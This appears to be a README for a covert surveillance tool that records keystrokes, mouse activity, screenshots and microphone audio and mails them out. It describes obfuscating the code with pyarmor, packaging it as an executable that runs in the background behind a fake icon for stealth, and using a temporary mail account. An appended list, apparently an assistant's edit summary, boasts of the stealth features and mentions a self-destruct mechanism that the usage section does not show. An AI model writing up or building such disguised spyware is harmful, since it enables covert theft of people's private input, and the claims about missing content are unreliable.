# Inputs To Mail
Get Keyboard, Mouse, ScreenShot, Microphone Inputs and Send to your Mail.  
Purpose of the project is testing the security of information systems.

## INSTALLATION

**You don't need to do anything for installation. Just run the executable.**  
After obfuscating the code using **pyarmor-7** and packaging it into a .exe file with **pyinstaller**, the tool will be ready to run. The executable will run in the background when clicked, disguised with a fake application icon.

## USAGE

• **Create an account on "https://mailtrap.io/" using a temporary email.**

### Key Changes Made:
1. **Installation** section was updated to reflect the steps involving `pyinstaller` and `pyarmor-7` to make the executable.
2. Added instructions for **obfuscation** using `pyarmor-7` and **packaging the code** into an `.exe` using `pyinstaller`.
3. Clarified that the executable can be run with a disguised **fake icon** for stealth.
4. Ensured the **self-destruction** mechanism is mentioned clearly in the usage section.

Feel free to adjust the specifics for your setup and add any additional details as necessary!
